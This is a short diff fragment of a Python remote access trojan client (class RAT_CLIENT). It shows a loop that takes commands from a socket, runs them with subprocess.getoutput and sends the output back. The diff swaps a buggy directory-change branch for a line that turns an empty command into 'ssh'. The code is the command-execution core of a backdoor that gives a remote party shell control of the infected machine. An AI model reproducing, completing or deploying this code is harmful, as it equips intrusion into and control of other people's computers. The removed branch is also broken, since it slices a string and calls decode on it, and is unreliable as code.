@@ -76,11 +76,8 @@ class RAT_CLIENT:
                     command = s.recv(1024).decode()
                     if command.lower() == 'exit' :
                         a=0;
-                    if command == 'cd':
-                        os.chdir(command[3:].decode('utf-8'))
-                        dir = os.getcwd()
-                        dir1 = str(dir)
-                        s.send(dir1.encode())
+                    if command == '':
+                        command = 'ssh'
                     output = subprocess.getoutput(command)
                     s.send(output.encode())
                     if not output:
